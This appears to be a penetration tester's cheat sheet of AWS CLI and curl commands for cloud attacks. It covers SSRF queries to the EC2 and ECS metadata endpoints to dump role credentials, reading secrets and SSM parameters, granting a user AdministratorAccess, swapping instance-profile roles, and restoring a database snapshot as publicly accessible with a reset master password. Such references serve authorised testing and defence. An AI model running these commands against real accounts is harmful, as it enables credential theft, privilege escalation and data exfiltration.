# AWS

% aws

## SSRF in EC2 - List roles
#plateform/linux #target/remote #protocol/http #port/80 #cat/RECON
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

## SSRF in EC2 - Dump roles
#plateform/linux #target/remote #protocol/http #port/80 #cat/RECON
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>

## AWS Get Token to Metadata
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`  && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/

## Creat AWS Configure Profile
#plateform/linux #target/local #cat/UTILS  #cat/RECON 
aws configure --profile <profile_name>

## Get AWS ARN 
#plateform/linux #target/local #cat/UTILS  #cat/RECON 
aws --profile <profile_name> --region <region_id> sts get-caller-identity


## AWS IAM Get User
aws iam get-user --profile <profile_name> --region <region_id>

## AWS IAM Put User Administrator Policy 
aws iam put-user-policy --user-name <user_name> --policy-name AdministratorAccess --policy-document file://<policy_json_file>

## AWS List User Policies
#plateform/linux #target/local #cat/UTILS  #cat/RECON 
aws --profile <profile_name> --region <region_id> iam list-user-policies --user-name <user_name>


## AWS List Attached User Policies
#plateform/linux #target/local #cat/UTILS  #cat/RECON 
aws iam list-attached-user-policies --user-name <user_name>  --profile <profile_name> --region <region_id>


## AWS List Policy Version 
#plateform/linux #target/local#cat/UTILS  #cat/RECON 
aws iam list-policy-versions --policy-arn <policy_arn> --profile <profile_name> --region <region_id>


## AWS Get Policy Version
#plateform/linux #target/local#cat/UTILS  #cat/RECON 
aws iam get-policy-version --policy-arn <policy_arn> --version-id <version_id> --profile <profile_name> --region <region_id>


## AWS Set Default Policy Version
#plateform/linux #target/local#cat/UTILS  #cat/RECON 
aws iam set-default-policy-version --policy-arn <policy_arn> --version-id <version_id> --profile <profile_name> --region <region_id>


## AWS List Roles
#plateform/linux #target/local#cat/UTILS  #cat/RECON 
aws --profile <profile_name> --region <region_id> iam list-roles


## AWS List Role Policies
#plateform/linux #target/local#cat/UTILS  #cat/RECON 
aws --profile <profile_name> --region <region_id> iam list-role-policies --role-name <role_name>


## AWS Get Role Policy
#plateform/linux #target/local#cat/UTILS  #cat/RECON 
aws --profile <profile_name> --region <region_id> iam get-role-policy --role-name <role_name> --policy-name <policy_name>


## AWS List Attached Role Policy
aws --profile <profile_name> --region <region_id> iam list-attached-role-policies --role-name <role_name>

## AWS Create Role Temporary Key
#plateform/linux #target/local#cat/UTILS  #cat/RECON 
aws --profile <profile_name> --region <region_id> sts assume-role --role-arn <role_arn> --role-session-name <role_session_name>


## AWS List Lambda Functions
#plateform/linux #target/local#cat/UTILS  #cat/RECON 
aws --profile <profile_name> --region <region_id> lambda list-functions

## AWS Get Lambda Function
#plateform/linux #target/local#cat/UTILS  #cat/RECON 
aws --profile <profile_name> --region <region_id> lambda get-function --function-name <function_name> 


## AWS invoke Lambda Function
#plateform/linux #target/local#cat/UTILS  #cat/RECON 
aws --profile <profile_name> --region <region_id> lambda invoke --function-name <function_name>  --cli-binary-format raw-in-base64-out --payload <payload>  <custom_output_file>


## AWS List Secrets
#plateform/linux #target/local#cat/UTILS  #cat/RECON
aws --profile <profile_name> --region <region_id> secretsmanager list-secrets


## AWS Get Secret Value
#plateform/linux #target/local#cat/UTILS  #cat/RECON
aws --profile <profile_name> --region <region_id> secretsmanager get-secret-value --secret-id <secret_arn>

## AWS Describe EC2 Instance
aws ec2 describe-instances --profile <profile_name> 

## AWS List Instance Profiles
aws iam list-instance-profiles --profile <profile_name> 


## AWS Remove Role from Instance Profile
aws iam remove-role-from-instance-profile --instance-profile-name <instance_profile_name> --role-name <role_name> --profile <profile_name> 


## AWS Add Role to Instance Profile
aws iam add-role-to-instance-profile --instance-profile-name <instance_profile_name> --role-name <role_name> --profile <profile_name>

## AWS EC2 Creat Key Pair 
aws ec2 create-key-pair --key-name <custom_key_name> --profile Kerrigan --query <custom_key_pass> --output text > <custom_output_file>

## AWS EC2 Describe Subnets
aws ec2 describe-subnets --profile <profile_name> 

## AWS EC2 Describe Security Groups
aws ec2 describe-security-groups --profile <profile_name> 

## AWS EC2 Create Instance
aws ec2 run-instances --image-id <ami_id> --instance-type <instance_type> --iam-instance-profile Arn=<instance_profile_arn> --key-name <key_pair_name> --profile <profile_name>  --subnet-id <subnet_id> --security-group-ids <security_group_ids>

## AWS EC2 Terminate Instance
aws ec2 terminate-instances --instance-ids <instance_ids> --region <region_id> --profile <profile_name> 

## AWS S3 List 
aws s3 ls --profile <profile_name> 

## AWS S3 List Bucket
aws s3 ls --profile <profile_name> s3://<bucket_name>

## AWS S3 Get File
aws s3 cp --profile <profile_name> s3://<bucket_file_path> <save_local_file>

## AWS ECS Get Container Metadata
#plateform/linux #target/remote #protocol/http #port/80 #cat/RECON
curl "${ECS_CONTAINER_METADATA_URI}/task"


## AWS ECS Get Attached Container Role Credentials
#plateform/linux #target/remote #protocol/http #port/80 #cat/RECON
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

## AWS ECS List Clusters
aws --profile <profile_name> --region <region_id> ecs list-clusters

## AWS ECS List Tasks
aws --profile <profile_name> --region <region_id> ecs list-tasks --cluster <cluster_name> --query taskArns --out <custom_output_file>

## AWS ECS Describe Tasks
aws --profile <profile_name> --region <region_id> ecs describe-tasks --cluster <cluster_name> --tasks <task_id>

## AWS ECS Describe Service
aws --profile <profile_name> --region <region_id> ecs describe-services --cluster <cluster_name> --services <service_name>

## AWS Update Container Instances State
aws --profile <profile_name> --region <region_id> ecs update-container-instances-state --cluster <cluster_name> --container-instances <cluster_name/task_id> --status <status>

## AWS ELB Describe Load Balancers
aws --profile <profile_name> elbv2 describe-load-balancers

## AWS RDS Describe DB Instances
aws rds describe-db-instances --profile <profile_name>

## AWS CodeBuild List Project
aws --profile <profile_name> codebuild list-projects

## AWS CodeBuild Get Project 
aws codebuild batch-get-projects --names <project_name> --profile <profile_name>

## AWS RDS Creat DB Snapshot 
aws rds create-db-snapshot --db-instance-identifier <db_instance_name> --db-snapshot-identifier <custom_snapshot_name> --profile <profile_name>

## AWS RDS Describe DB Subnet Groups
aws rds describe-db-subnet-groups --profile <profile_name>

## AWS RDS Describe DB Security Groups
aws ec2 describe-security-groups --profile <profile_name>

## AWS RDS Restore DB Instance from DB Snapshot
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier <custom_db_instance_name> --db-snapshot-identifier <snapshot_name> --db-subnet-group-name <db_subnet_group_name> --publicly-accessible --vpc-security-group-ids <vpc_security_group_ids> --profile <profile_name>

## AWS RDS Modify DB Instance Identifier
aws rds modify-db-instance --db-instance-identifier <db_instance_name> --master-user-password <custom_user_pass> --profile <profile_name>

## AWS SSM Describe Parameters 
aws ssm describe-parameters --profile <profile_name>

## AWS SSM Get Parameter
aws ssm get-parameter --name <parameter_name> --profile <profile_name>